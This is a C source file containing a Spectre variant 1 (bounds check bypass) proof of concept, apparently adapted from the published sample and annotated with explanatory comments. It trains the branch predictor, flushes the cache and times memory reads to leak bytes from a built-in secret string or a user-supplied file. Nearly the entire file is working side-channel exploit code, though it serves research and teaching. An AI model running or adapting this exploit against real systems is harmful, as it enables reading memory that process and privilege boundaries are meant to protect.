//
// Created by foride on 5/6/2023.
//

#include <stdio.h>
#include <stdint.h>
#include <x86intrin.h>
#include "filePathToAddress.h"


//CACHE_HIT_THRESHOLD: default is 80, assume cache hit if time <= threshold
int CACHE_HIT_THRESHOLD;
// An array whose memory locations are available to read, write and modify for an attacker
uint8_t availableMemoryArray[160] = {};
// The size of the array
unsigned int arrayAvailableSize = 160;
// An array used to point on memory locations that the user is not authorized to access.
uint8_t unavailableMemoryArray[256 * 512];
// for test whether the code is working, pointer on "secret" (unauthorized for us) location
char* secret = "Secret message hidden in memory";

// Prevents the compiler from optimization of the victim_function
uint8_t temp = 0;

void victim_function(size_t x) {
    if (x < arrayAvailableSize) {
        temp &= unavailableMemoryArray[availableMemoryArray[x] * 512];
    }
}


void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int tries, i, j, indexHighest, indexSecondHighest, mix_i;
    unsigned int junk = 0;
    size_t x;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++)
        results[i] = 0;
    for (tries = 999; tries > 0; tries--) {
        // flushing every variable unavailableMemoryArray memory location from cache
        for (i = 0; i < 256; i++)
            _mm_clflush(&unavailableMemoryArray[i * 512]);

        // 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x)
        // training_x has value between 0 and 159 in our case
        for (j = 29; j >= 0; j--)
        {
            // for each iteration memory location address of array1_size is flushed from cache
            _mm_clflush(&arrayAvailableSize);
            // delay, to be improved
            for (volatile int z = 0; z < 100; z++)
            {
            } /* Delay (can also mfence) */

            /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
            /* Avoid jumps in case those tip off the branch predictor */
            x = ((j % 6) - 1) & malicious_x; /* Set x=FFF.FF0000 if j%6==0, else x=0 */

            /* Call the victim! */
            victim_function(x);
        }

        // order is mixed up to prevent technique used by the processor's cache to predict the next memory access and prefetch the data in advance


        /* Time reads. Order is lightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++)
        {
            // mix technique is based on using prime numbers to get unique and hard to predict result, result is a value between 0 and 255
            mix_i = ((i * 167) + 13) & 255;
            // A variable which holds address of different cache line each iteration
            addr = &unavailableMemoryArray[mix_i * 512];
            // measures time needed for read of a cache memory address
            time1 = __rdtscp(&junk); /* READ TIMER */
            // junk now points on variable addr address
            junk = *addr; /* MEMORY ACCESS TO TIME */
            // cache memory address access time or main memory address access time  - cache memory address access time
            time2 = __rdtscp(&junk) - time1; /* READ TIMER & COMPUTE ELAPSED TIME */

            /* checks whether the measured time for accessing a memory location is less than or equal to the CACHE_HIT_THRESHOLD
            and whether the accessed memory location is not the same as the one accessed in the previous loop iteration */
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != availableMemoryArray[tries % arrayAvailableSize])
                // cache hit - add +1 to score for this value
                results[mix_i]++;
        }

        // Locate highest & second-highest result
        indexHighest = indexSecondHighest = 0;
        for (i = 0; i < 256; i++)
        {
            if (results[i] > results[indexSecondHighest]) {
                if (results[i] > results[indexHighest]) {

                    indexHighest = i;
                } else {

                    indexSecondHighest = i;
                }
            }
        }
        if (results[indexHighest] >= (2 * results[indexSecondHighest] + 5) || (results[indexHighest] == 2 && results[indexSecondHighest] == 0))
            // Clear success if best is > 2*runner-up + 5 or 2/0)
            break;
    }
    // Junk prevents optimization of the code below
    results[0] ^= junk;
    value[0] = (uint8_t)indexHighest;
    score[0] = results[indexHighest];
    value[1] = (uint8_t)indexSecondHighest;
    score[1] = results[indexSecondHighest];
}

int main(int argc, const char **argv) {
    FileData fileData;
    FileReader reader;
    int i, score[2], secretByteLength=32;
    uint8_t value[2];
    //  load into physical memory.
    for (i = 0; i < sizeof(unavailableMemoryArray); i++)
        unavailableMemoryArray[i] = 1;
    //  Checks whether the program was executed with two command-line arguments,the first argument is file path
    //  the second argument is CACHE_HIT_THRESHOLD
    //  Reads file path and creates pointer to the memory location of data of file path provided
    if (argc==3) {
        const char *filename = argv[1];
        sscanf(argv[2], "%d", &CACHE_HIT_THRESHOLD);

        if (!FileReader_open(&reader, filename)) {
            printf("Failed to open the file.\n");
            return 1;
        }

        fileData = FileReader_readIntoBuffer(&reader);

        if (fileData.size == 0) {
            printf("Memory allocation failed.\n");
            FileReader_close(&reader);
            return 1;
        }

        secret = fileData.buffer;
        secretByteLength = fileData.size;

    } else {
        printf("Default run environment without program arguments\n");
        CACHE_HIT_THRESHOLD = 80;
    }
    //  Calculates the offset between the secret value and the beginning of the accessible memory array in bytes
    size_t malicious_x=(secret-(char*)availableMemoryArray);

    printf("Reading %d bytes:\n", secretByteLength);
    while (--secretByteLength >= 0) {
        printf("Reading from a memory location = %p ", (void*)malicious_x);
        // ReadMemoryByte() function call to read a byte of data from the current memory location
        readMemoryByte(malicious_x++, value, score);
        // If score[0] is greater than or equal to twice the value of score[1], then "Success" is printed. Otherwise, "Unclear" is printed.
        printf("%s: ", (score[0] >= 2*score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%d        ", value[0], value[0], score[0]);
        if (score[1] > 0) {
            printf("second best: 0x%02X score=%d", value[1], score[1]);
        }
        printf("\n");
    }

    FileData_free(&fileData);
    FileReader_close(&reader);
    return (0);
}